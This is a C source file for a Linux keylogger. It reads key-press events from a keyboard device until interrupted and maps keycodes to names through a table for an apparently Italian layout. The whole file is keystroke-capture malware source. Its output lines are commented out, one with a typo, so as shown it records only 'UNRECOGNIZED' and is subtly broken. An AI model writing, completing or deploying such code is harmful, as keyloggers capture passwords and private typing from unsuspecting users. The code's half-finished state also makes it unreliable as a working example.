#include "keylogger.h"

#define BUFFER_SIZE 100
#define NUM_KEYCODES 71

const char *keycodes[] = {
        "RESERVED",
        "ESC",
        "1",
        "2",
        "3",
        "4",
        "5",
        "6",
        "7",
        "8",
        "9",
        "0",
        "APOSTROPHE",
        "L_ACCENT_I",
        "BACKSPACE",
        "TAB",
        "Q",
        "W",
        "E",
        "R",
        "T",
        "Y",
        "U",
        "I",
        "O",
        "P",
        "L_ACCENT_E",
        "PLUS",
        "ENTER",
        "LEFTCTRL",
        "A",
        "S",
        "D",
        "F",
        "G",
        "H",
        "J",
        "K",
        "L",
        "L_ACCENT_O",
        "L_ACCENT_A",
        "L_ACCENT_U",
        "LEFTSHIFT",
        "LESS_THAN",
        "Z",
        "X",
        "C",
        "V",
        "B",
        "N",
        "M",
        "COMMA",
        "DOT",
        "MINUS",
        "RIGHTSHIFT",
        "KPASTERISK",
        "LEFTALT",
        "SPACE",
        "CAPSLOCK",
        "F1",
        "F2",
        "F3",
        "F4",
        "F5",
        "F6",
        "F7",
        "F8",
        "F9",
        "F10",
        "NUMLOCK",
        "SCROLLLOCK"
};

int loop = 1;

void sigint_handler(int sig) {
    loop = 0;
}

void keylogger(int keyboard, int writeout) {
    int eventSize = sizeof(struct input_event);
    ssize_t bytesRead = 0;
    struct input_event events[NUM_EVENTS];

    struct sigaction int_handler;
    int_handler.sa_handler = &sigint_handler;
    sigaction(SIGINT, &int_handler, NULL);

    while (loop) {
        bytesRead = read(keyboard, events, eventSize * NUM_EVENTS);

        for (int i = 0; i < (bytesRead / eventSize); i++) {
            if (events[i].type == EV_KEY) {
                if (events[i].value == 1) {
                    if (events[i].code > 0 && events[i].code < NUM_KEYCODES) {
                        //afe_write_all(writeout, keycodes[events[i].code], keyboard);
                        //safe_write_all(writeout, "\n", keyboard);
                    } else {
                        write(writeout, "UNRECOGNIZED", sizeof("UNRECOGNIZED"));
                    }
                }
            }
        }
    }

    //if (bytesRead > 0) safe_write_all(writeout, "\n", keyboard);
}
